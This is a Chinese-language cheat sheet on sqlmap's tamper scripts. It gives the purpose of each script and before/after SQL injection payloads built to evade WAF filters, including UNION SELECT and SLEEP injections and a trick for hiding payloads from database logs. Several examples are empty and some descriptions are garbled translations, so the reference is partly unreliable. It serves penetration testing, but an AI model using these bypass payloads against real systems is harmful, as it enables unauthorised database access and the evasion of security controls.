#SQLMAP Tamper Summary  

###0x01 简介  
sqlmap中的tamper脚本来对目标进行更高效的攻击。当目标主机有WAF进行过滤的时候，可以使用tamper来进行绕过；本文介绍了SQLMAP中自带的Tamper脚本，特定场合也需要自己写脚本。  

###0x02 正文  

> 脚本名：apostrophemask.py  

作用：用UTF-8全角字符替换单引号字符  
Example：
	
	（"1 AND '1'='1"）
	'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871' 
	

> 脚本名：apostrophenullencode.py  

作用：绕过过滤双引号，替换字符和双引号  
Example：  
	
	tamper("1 AND '1'='1")
	'1 AND %00%271%00%27=%00%271'


> 脚本名：appendnullbyte.py

作用：在payload末尾添加空字符编码    
Example：

	('1 AND 1=1')
	'1 AND 1=1%00'


> 脚本名：base64encode.py  

作用：对给定的payload全部字符使用Base64编码    
Example：

	("1' AND SLEEP(5)#")
	'MScgQU5EIFNMRUVQKDUpIw=='


> 脚本名：between.py  

作用：分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”    
Example：
	
	('1 AND A > B--')
	'1 AND A NOT BETWEEN 0 AND B--'


> 脚本名：bluecoat.py  

作用：在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”    
Example：

	('SELECT id FROM users where id = 1')
	'SELECT%09id FROM users where id LIKE 1'


> 脚本名：chardoubleencode.py   

作用：对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）    
Example：

	SELECT FIELD FROM%20TABLE
	%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545


> 脚本名：charencode.py  

作用：对给定的payload全部字符使用URL编码（不处理已经编码的字符）    
Example：

	SELECT FIELD FROM%20TABLE
	%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45


> 脚本名：charunicodeencode.py   

作用：对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）    
Example：

	SELECT FIELD%20FROM TABLE
	%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′


> 脚本名：concat2concatws.py  

作用：用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例    
Example：


> 脚本名：equaltolike.py    

作用：用“LIKE”运算符替换全部等于号“=”    
Example：

	SELECT * FROM users WHERE id=1
	SELECT * FROM users WHERE id LIKE 1


> 脚本名：greatest.py   

作用： 用“GREATEST”函数替换大于号“>”    
Example：

	('1 AND A > B')
	'1 AND GREATEST(A,B+1)=A'


> 脚本名：halfversionedmorekeywords.py   

作用： 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql注释
Example：

	("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
	"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"


> 脚本名：ifnull2ifisnull.py    

作用：用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例    
Example：

	('IFNULL(1, 2)')
	'IF(ISNULL(1),2,1)'


> 脚本名：lowercase.py   

作用：用小写值替换每个关键字字符    
Example：


> 脚本名：modsecurityversioned.py  

作用：过滤空格，包含完整的查询版本注释  
Example：

	('1 AND 2>1--')
	'1 /*!30874AND 2>1*/--'


> 脚本名：modsecurityzeroversioned.py  

作用：包含了完整的查询与零版本注释
Example：

	('1 AND 2>1--')
	'1 /*!00000AND 2>1*/--'


> 脚本名：multiplespaces.py   

作用：在SQL关键字周围添加多个空格    
Example：

	('1 UNION SELECT foobar')
	'1    UNION     SELECT   foobar'


> 脚本名：nonrecursivereplacement.py  

作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如  .replace（“SELECT”、””)） filters
Example：

	('1 UNION SELECT 2--')
	'1 UNIOUNIONN SELESELECTCT 2--'


> 脚本名：overlongutf8.py  

作用：转换给定的payload当中的所有字符    
Example：


> 脚本名：percentage.py   

作用：在每个字符之前添加一个百分号    
Example：
	
	SELECT FIELD FROM TABLE
	%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E


> 脚本名：randomcase.py    

作用：随机转换每个关键字字符的大小写    
Example：

	INSERT
	InsERt


> 脚本名：randomcomments.py  

作用：向SQL关键字中插入随机注释    
Example：

	‘INSERT’
	‘IN/**/S/**/ERT’


> 脚本名：securesphere.py   

作用：添加经过特殊构造的字符串    
Example：

	('1 AND 1=1')
	"1 AND 1=1 and '0having'='0having'"


> 脚本名：sp_password.py  

作用：向payload末尾添加“sp_password”,从DBMS日志的自动模糊处理的有效载荷的末尾
Example：

	('1 AND 9227=9227-- ')
	'1 AND 9227=9227-- sp_password'


> 脚本名：space2comment.py   

作用：用“/**/”替换空格符    
Example：

	SELECT id FROM users
	SELECT/**/id/**/FROM/**/users


> 脚本名：space2dash.py  

作用：绕过过滤‘=’ 替换空格字符（' '），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
Example：

	('1 AND 9227=9227')
	'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'


> 脚本名：space2hash.py   

作用：用注释符“#”其次是一个随机字符串和一个换行符替换空格符    
Example：

	1 AND 9227=9227
	1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227


> 脚本名：space2morehash.py   

作用：用注释符“#”其次是一个随机字符串和一个换行符替换空格符    
Example：

	1 AND 9227=9227
	1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227


> 脚本名：space2mssqlblank.py   

作用：用一组有效的备选字符集当中的随机空白符替换空格符    
Example：
	
	SELECT id FROM users
	SELECT%08id%02FROM%0Fusers

ASCII Table：
	
	#   SOH     01      start of heading
	#   STX     02      start of text
	#   ETX     03      end of text
	#   EOT     04      end of transmission
	#   ENQ     05      enquiry
	#   ACK     06      acknowledge
	#   BEL     07      bell
	#   BS      08      backspace
	#   TAB     09      horizontal tab
	#   LF      0A      new line
	#   VT      0B      vertical TAB
	#   FF      0C      new page
	#   CR      0D      carriage return
	#   SO      0E      shift out
	#   SI      0F      shift in

> 脚本名：space2mssqlhash.py  

作用：用注释符“#”其次是一个换行符替换空格符    
Example：

	('1 AND 9227=9227')
	'1%23%0AAND%23%0A9227=9227'


> 脚本名：space2mysqlblank.py  

作用：用一组有效的备选字符集当中的随机空白符替换空格符    
Example：

	SELECT id FROM users
	SELECT%0Bid%0BFROM%A0users

空白符：

	#   TAB     09      horizontal TAB
	#   LF      0A      new line
	#   FF      0C      new page
	#   CR      0D      carriage return
	#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)
	#   -       A0      -                   (MySQL only)


> 脚本名：space2mysqldash.py  

作用：mysql中，替换空格字符（' '）（’–‘）后跟一个破折号注释一个新行（’n’）  
Example：

	('1 AND 9227=9227')
	'1--%0AAND--%0A9227=9227'


> 脚本名：space2plus.py     

作用：用加号“+”替换空格符    
Example：

	('SELECT id FROM users')
	'SELECT+id+FROM+users'


> 脚本名：space2randomblank.py  

作用：用一组有效的备选字符集当中的随机空白符替换空格符    
Example：

	('SELECT id FROM users')
	'SELECT%0Did%0DFROM%0Ausers'


> 脚本名：unionalltounion.py  

作用：用“UNION SELECT”替换“UNION ALL SELECT”    
Example：

	('-1 UNION ALL SELECT')
	'-1 UNION SELECT'


> 脚本名：unmagicquotes.py  

作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格符,宽字符绕过 GPC  addslashes    
Example：

	1′ AND 1=1
	1%bf%27 AND 1=1–%20


> 脚本名：varnish.py  

作用：添加一个HTTP头“X-originating-IP”来绕过WAF    
Example：



> 脚本名：versionedkeywords.py  

作用：用MySQL注释包围每个非函数关键字    
Example：
	
	1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
	1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#


> 脚本名：versionedmorekeywords.py  

作用：用MySQL注释包围每个关键字    
Example：

	1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
	1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#


> 脚本名：xforwardedfor.py  

作用：添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF    
Example：
	
</br>

-----------------------------------
参考内容：  
推酷：<http://www.tuicool.com/articles/RbUvqea>  
红黑联盟： <http://www.2cto.com/Article/201502/374877.html>  
黑吧安全网： <http://www.myhack58.com/Article/html/3/7/2015/62119.htm>  
黑吧安全网： <http://www.myhack58.com/Article/html/3/7/2016/78342.htm>